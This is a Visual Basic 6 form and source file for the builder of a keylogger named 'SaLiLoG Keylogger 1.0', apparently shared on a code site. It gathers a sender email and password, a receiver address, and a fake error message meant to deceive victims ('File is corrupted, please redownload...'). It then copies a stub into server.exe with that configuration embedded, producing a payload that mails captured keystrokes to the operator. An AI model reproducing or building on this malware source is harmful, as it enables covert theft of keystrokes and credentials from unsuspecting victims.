VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H00004000&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "SaLiLoG Keylogger 1.0"
   ClientHeight    =   3540
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   3780
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   3540
   ScaleWidth      =   3780
   StartUpPosition =   2  'CenterScreen
   Begin VB.TextBox Text4 
      Appearance      =   0  'Flat
      BackColor       =   &H00008000&
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   300
      Left            =   90
      TabIndex        =   3
      Text            =   "File is corrupted, please redownload and try again."
      Top             =   1890
      Width           =   3615
   End
   Begin VB.CommandButton Command1 
      Appearance      =   0  'Flat
      BackColor       =   &H0000C000&
      Caption         =   "READ ME FIRST"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   14.25
         Charset         =   178
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   300
      Left            =   90
      MaskColor       =   &H0000FF00&
      Style           =   1  'Graphical
      TabIndex        =   5
      Top             =   3150
      Width           =   3600
   End
   Begin VB.TextBox Text3 
      Appearance      =   0  'Flat
      BackColor       =   &H00008000&
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   300
      Left            =   90
      TabIndex        =   2
      Top             =   1350
      Width           =   3615
   End
   Begin VB.TextBox Text2 
      Appearance      =   0  'Flat
      BackColor       =   &H00008000&
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   300
      Left            =   90
      TabIndex        =   1
      Top             =   810
      Width           =   3615
   End
   Begin VB.TextBox Text1 
      Appearance      =   0  'Flat
      BackColor       =   &H00008000&
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   285
      Left            =   90
      TabIndex        =   0
      Top             =   270
      Width           =   3615
   End
   Begin VB.CommandButton Command2 
      Appearance      =   0  'Flat
      BackColor       =   &H0000C000&
      Caption         =   "Compile"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   300
      Left            =   90
      MaskColor       =   &H0000FF00&
      Style           =   1  'Graphical
      TabIndex        =   4
      Top             =   2295
      Width           =   3600
   End
   Begin VB.Label Label2 
      Caption         =   "SaLiLoG keylogger by Salar Zeynali - Salixem@Gmail.Com"
      Height          =   195
      Left            =   1035
      TabIndex        =   12
      Top             =   1.50000e5
      Width           =   1590
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "Fake message:"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   240
      Index           =   5
      Left            =   90
      TabIndex        =   11
      Top             =   1665
      Width           =   1500
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "Salixem@Gmail.Com"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   240
      Index           =   4
      Left            =   90
      TabIndex        =   10
      Top             =   2880
      Width           =   3615
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "By Salar Zeynali"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   240
      Index           =   3
      Left            =   90
      TabIndex        =   9
      Top             =   2655
      Width           =   3615
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "Receiver mail:"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   240
      Index           =   2
      Left            =   90
      TabIndex        =   8
      Top             =   1125
      Width           =   1500
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "Sender pass:"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   240
      Index           =   1
      Left            =   90
      TabIndex        =   7
      Top             =   585
      Width           =   1320
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "Sender mail:"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   240
      Index           =   0
      Left            =   90
      TabIndex        =   6
      Top             =   45
      Width           =   1320
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'                    SaLiLoG 1.0
'                  By SaLar Zeynali
'        Salixem@Gmail.Com - S4LiX3M@Yahoo.Com
'  _________      .____    .______  ___        _____
' /   _____/____  |    |   |__\   \/  /____   /     \
' \_____  \\__  \ |    |   |  |\     // __ \ /  \ /  \
' /        \/ __ \|    |___|  |/     \  ___//    Y    \
'/_______  (____  /_______ \__/___/\  \___  >____|__  /
'        \/     \/        \/        \_/   \/        \/
Option Explicit
Private Sub Command1_Click()
Form2.Show
End Sub
Private Sub Command2_Click()
Dim PropBag As PropertyBag
Set PropBag = New PropertyBag
PropBag.WriteProperty "SndMail", Text1.Text
PropBag.WriteProperty "SndPwd", Text2.Text
PropBag.WriteProperty "RcvMail", Text3.Text
PropBag.WriteProperty "FakeMsg", Text4.Text
FileCopy App.Path & "\stub.dat", App.Path & "\server.exe"
CompileData App.Path & "\server.exe", PropBag
MsgBox "Server saved to " & App.Path & "\server.exe", vbOKOnly + vbInformation, "Server created"
End Sub

Private Sub Form_Unload(Cancel As Integer)
MsgBox "Please vote for me on pscode if you like my code,Thank you.", vbOKOnly + vbInformation, "Wanna say thanks?"
End Sub
